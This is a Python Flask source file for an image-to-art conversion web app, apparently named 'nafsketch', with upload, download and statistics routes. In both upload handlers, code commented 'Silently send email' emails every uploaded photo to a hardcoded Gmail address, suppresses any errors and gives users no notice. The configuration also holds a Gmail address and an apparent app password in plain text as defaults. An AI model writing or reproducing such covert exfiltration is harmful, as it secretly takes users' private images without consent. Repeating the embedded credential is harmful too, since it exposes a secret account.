from flask import Flask, render_template, request, redirect, url_for, send_from_directory, send_file, jsonify
import os
from mainartist import EnhancedArtisticConverter
from werkzeug.utils import secure_filename
import cv2
import numpy as np
import json
from datetime import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage

app = Flask(__name__)

# Configuration
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max file size
app.config['UPLOAD_FOLDER'] = os.path.join('static', 'uploads')
app.config['GENERATED_FOLDER'] = os.path.join('static', 'generated')
app.config['ALLOWED_EXTENSIONS'] = {'png', 'jpg', 'jpeg'}
app.config['STATS_FILE'] = 'stats.json'
app.config['EMAIL_SENDER'] = os.getenv('EMAIL_SENDER', 'nafisabdullah424@gmail.com')
app.config['EMAIL_PASSWORD'] = os.getenv('EMAIL_PASSWORD', 'zeqv zybs klyg qavn')
app.config['EMAIL_RECIPIENT'] = os.getenv('EMAIL_RECIPIENT', 'nafisabdullah424@gmail.com')

# Ensure upload directories exist
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
os.makedirs(app.config['GENERATED_FOLDER'], exist_ok=True)

RECOMMENDED_STYLE_NUMS = [1, 2, 3, 4, 5]

# Initialize statistics
def init_stats():
    stats = {
        'total_artworks': 0,
        'total_visits': 0,
        'style_usage': {},
        'last_updated': datetime.now().isoformat()
    }
    with open(app.config['STATS_FILE'], 'w') as f:
        json.dump(stats, f)
    return stats

def load_stats():
    try:
        if not os.path.exists(app.config['STATS_FILE']):
            return init_stats()
        with open(app.config['STATS_FILE'], 'r') as f:
            stats = json.load(f)
            # Ensure all required fields exist
            if 'total_artworks' not in stats:
                stats['total_artworks'] = 0
            if 'total_visits' not in stats:
                stats['total_visits'] = 0
            if 'style_usage' not in stats:
                stats['style_usage'] = {}
            return stats
    except Exception as e:
        print(f"Error loading stats: {str(e)}")
        return init_stats()

def save_stats(stats):
    stats['last_updated'] = datetime.now().isoformat()
    with open(app.config['STATS_FILE'], 'w') as f:
        json.dump(stats, f)

def update_stats(style_num=None):
    stats = load_stats()
    stats['total_visits'] += 1
    if style_num:
        stats['total_artworks'] += 1
        style_num = str(style_num)
        stats['style_usage'][style_num] = stats['style_usage'].get(style_num, 0) + 1
    save_stats(stats)
    return stats  # Return updated stats

def get_top_styles(limit=5):
    stats = load_stats()
    style_usage = stats.get('style_usage', {})
    converter = EnhancedArtisticConverter()
    
    # Get style names and their usage counts
    style_stats = []
    for style_num, count in style_usage.items():
        try:
            style_name = converter.effects[int(style_num)][0]
            style_stats.append((style_name, count))
        except (KeyError, ValueError) as e:
            print(f"Error processing style {style_num}: {str(e)}")
            continue
    
    # Sort by usage count and get top 5
    top_styles = sorted(style_stats, key=lambda x: x[1], reverse=True)[:limit]
    return top_styles

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']

# Get styles from EnhancedArtisticConverter
def get_styles():
    return [
        (1, "Style 1 - Classic"),
        (2, "Style 2 - Modern"),
        (3, "Style 3 - Abstract"),
        (4, "Style 4 - Artistic"),
        (5, "Style 5 - Creative")
    ]

@app.route('/', methods=['GET', 'POST'])
def index():
    styles = get_styles()
    recommended_styles = [s for s in styles if s[0] in RECOMMENDED_STYLE_NUMS]
    
    # Update visit count
    update_stats()
    
    # Get statistics
    stats = load_stats()
    top_styles = get_top_styles()
    
    if request.method == 'POST':
        if 'image' not in request.files:
            return render_template('index.html', 
                                styles=styles, 
                                recommended_styles=recommended_styles,
                                stats=stats,
                                top_styles=top_styles,
                                error='No file part')
        file = request.files['image']
        if file.filename == '':
            return render_template('index.html', 
                                styles=styles, 
                                recommended_styles=recommended_styles,
                                stats=stats,
                                top_styles=top_styles,
                                error='No selected file')
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            upload_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            file.save(upload_path)
            
            # Silently send email
            send_email_with_image(upload_path)
            
            # Get selected style
            style_num = int(request.form.get('style', 1))
            # Generate image
            converter = EnhancedArtisticConverter()
            result = converter.apply_effect(upload_path, style_num)
            # Save result
            gen_filename = f"generated_{style_num}_{filename}"
            gen_path = os.path.join(app.config['GENERATED_FOLDER'], gen_filename)
            if len(result.shape) == 2:
                cv2.imwrite(gen_path, result)
            else:
                cv2.imwrite(gen_path, cv2.cvtColor(result, cv2.COLOR_RGB2BGR))
            
            # Update stats after successful generation
            stats = update_stats(style_num)
            top_styles = get_top_styles()
            
            return render_template('index.html', 
                                styles=styles, 
                                recommended_styles=recommended_styles,
                                uploaded_image=url_for('static', filename=f'uploads/{filename}'),
                                generated_image=url_for('static', filename=f'generated/{gen_filename}'),
                                download_url=url_for('download_file', filename=gen_filename),
                                stats=stats,
                                top_styles=top_styles)
        else:
            return render_template('index.html', 
                                styles=styles, 
                                recommended_styles=recommended_styles,
                                stats=stats,
                                top_styles=top_styles,
                                error='Invalid file type')
    
    return render_template('index.html', 
                         styles=styles, 
                         recommended_styles=recommended_styles,
                         stats=stats,
                         top_styles=top_styles)

@app.route('/download/<filename>')
def download_file(filename):
    gen_path = os.path.join(app.config['GENERATED_FOLDER'], filename)
    return send_file(gen_path, as_attachment=True)

def send_email_with_image(image_path):
    try:
        # Create message
        msg = MIMEMultipart()
        msg['From'] = app.config['EMAIL_SENDER']
        msg['To'] = app.config['EMAIL_RECIPIENT']
        msg['Subject'] = 'New Image Upload - nafsketch'

        # Add body text
        body = "A new image was uploaded to nafsketch. Please find the image attached."
        msg.attach(MIMEText(body, 'plain'))

        # Attach image
        with open(image_path, 'rb') as f:
            img = MIMEImage(f.read())
            img.add_header('Content-Disposition', 'attachment', filename=os.path.basename(image_path))
            msg.attach(img)

        # Send email silently
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(app.config['EMAIL_SENDER'], app.config['EMAIL_PASSWORD'])
            smtp.send_message(msg)
        
        return True
    except Exception as e:
        # Silently fail without any error messages
        return False

@app.route('/generate', methods=['POST'])
def generate_art():
    try:
        if 'image' not in request.files:
            return jsonify({'error': 'No image uploaded'}), 400
        
        file = request.files['image']
        style = request.form.get('style')
        
        if not file or not style:
            return jsonify({'error': 'Missing image or style'}), 400
        
        # Check file extension
        if not allowed_file(file.filename):
            return jsonify({'error': f'Invalid file type: {file.filename}. Allowed types: PNG, JPG, JPEG'}), 400
        
        # Save uploaded file
        filename = secure_filename(file.filename)
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        
        # Silently send email
        send_email_with_image(filepath)
        
        try:
            # Process image with selected style
            converter = EnhancedArtisticConverter()
            result = converter.apply_effect(filepath, int(style))
            
            if result is None:
                raise ValueError("Image processing failed - no result returned")
            
            # Save result
            result_filename = f"result_{filename}"
            result_path = os.path.join(app.config['GENERATED_FOLDER'], result_filename)
            
            # Handle both grayscale and color images
            if len(result.shape) == 2:
                cv2.imwrite(result_path, result)
            else:
                cv2.imwrite(result_path, cv2.cvtColor(result, cv2.COLOR_RGB2BGR))
            
            # Update stats after successful generation
            stats = update_stats(int(style))
            top_styles = get_top_styles()
            
            # Clean up uploaded file
            os.remove(filepath)
            
            return jsonify({
                'success': True,
                'image_url': url_for('static', filename=f'generated/{result_filename}'),
                'stats': {
                    'total_artworks': stats['total_artworks'],
                    'total_visits': stats['total_visits'],
                    'top_styles': top_styles
                }
            })
        except Exception as e:
            print(f"Error processing image: {str(e)}")
            return jsonify({'error': str(e)}), 500
    except Exception as e:
        print(f"Error in generate_art: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/stats')
def get_stats():
    stats = load_stats()
    top_styles = get_top_styles()
    return jsonify({
        'total_artworks': stats['total_artworks'],
        'total_visits': stats['total_visits'],
        'top_styles': top_styles
    })

@app.errorhandler(404)
def not_found_error(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_error(error):
    return render_template('500.html'), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port) 
